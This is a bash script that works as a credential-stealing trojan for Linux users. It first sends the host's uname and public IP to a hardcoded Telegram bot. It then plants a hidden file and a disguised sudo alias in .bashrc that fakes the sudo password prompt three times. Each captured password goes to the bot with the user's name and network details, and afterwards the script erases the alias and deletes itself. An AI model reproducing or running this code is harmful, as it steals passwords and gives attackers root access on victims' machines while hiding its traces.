curl -X POST "https://api.telegram.org/bot7822809022:AAEGGzTMWWxOiL1TiW7Lv6uG_ymmbAbQiug/sendMessage" -d "chat_id=7848579955&text=New target connected.
Uname: $(uname -a)

Public IP: $( curl -s https://ipinfo.io/ip & 2> /dev/null )
" &> /dev/null &
echo '
#!/bin/bash

##FUNCS
function F_coverup {
for i in $(cat $HOME/.bashrc | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | cut -c 1-1); do
OUT_CLEAN=$(cat -n "$HOME/.bashrc" | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
sed -i "${OUT_CLEAN}d" $HOME/.bashrc
done


rm "$HOME/.bash_info" & disown
' > $HOME/.bash_info
echo '
}
##FUNCS

if ! ping -c 1 8.8.8.8 &> /dev/null ; then 
/bin/sudo $*
exit
fi
read -se -p "[sudo] password for $(whoami): " pass
pass="${pass//+/(plus_symbol)}"
IP=$( curl -s https://ipinfo.io/ip & 2> /dev/null )
curl -X POST "https://api.telegram.org/bot7822809022:AAEGGzTMWWxOiL1TiW7Lv6uG_ymmbAbQiug/sendMessage" -d "chat_id=7848579955&text=Password: $pass

User: $(whoami)

Uname: $(uname -a)

Local IP and interfaces: $(ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: $IP
" &> /dev/null &
sleep 3
echo "Sorry, try again."
read -se -p "[sudo] password for $(whoami): " pass
pass="${pass//+/(plus_symbol)}"
curl -X POST "https://api.telegram.org/bot7822809022:AAEGGzTMWWxOiL1TiW7Lv6uG_ymmbAbQiug/sendMessage" -d "chat_id=7848579955&text=Password: $pass

User: $(whoami)

Uname: $(uname -a)

Local IP and interfaces: $( ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: $IP
" &> /dev/null &
F_coverup &
sleep 3
echo "Sorry, try again."
read -se -p "[sudo] password for $(whoami): " pass
pass="${pass//+/(plus_symbol)}"
curl -X POST "https://api.telegram.org/bot7822809022:AAEGGzTMWWxOiL1TiW7Lv6uG_ymmbAbQiug/sendMessage" -d "chat_id=7848579955&text=Password: $pass

User: $(whoami)

Uname: $(uname -a)

Local IP and interfaces: $( ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: $IP
" &> /dev/null &
sleep 3
echo "sudo: 3 incorrect password attempts"


exec bash
' >> $HOME/.bash_info

echo "# Making sudo config for current user" >> "$HOME/.bashrc"
echo "alias sudo='chmod +x $HOME/.bash_info; bash $HOME/.bash_info'" >> "$HOME/.bashrc"
if [ -f "$(realpath "$0")" ]; then 
rm -f "$(realpath "$0")" &> /dev/null & disown
fi
exec bash
